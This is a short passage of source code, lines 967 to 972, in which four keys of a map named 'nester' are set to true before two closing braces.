967         nester[one] = true;
968         nester[two] = true;
969         nester[three] = true;
970         nester[four] = true;
971     }
972 }